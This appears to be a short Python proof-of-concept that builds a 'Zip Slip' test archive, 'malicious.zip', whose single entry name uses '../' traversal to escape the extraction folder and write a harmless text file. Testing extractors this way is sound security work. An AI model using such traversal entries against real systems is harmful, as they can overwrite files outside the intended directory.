import zipfile

# The malicious entry name includes a directory ('subdir') and traversal to escape ('../../evil.txt')
malicious_entry = "subdir/../../../evil.txt"
payload = "This is a harmless test file to demonstrate Zip Slip vulnerability."

with zipfile.ZipFile('malicious.zip', 'w') as zipf:
    # writestr allows you to specify the entry name explicitly.
    zipf.writestr(malicious_entry, payload)

print("Created malicious.zip with entry:", malicious_entry)

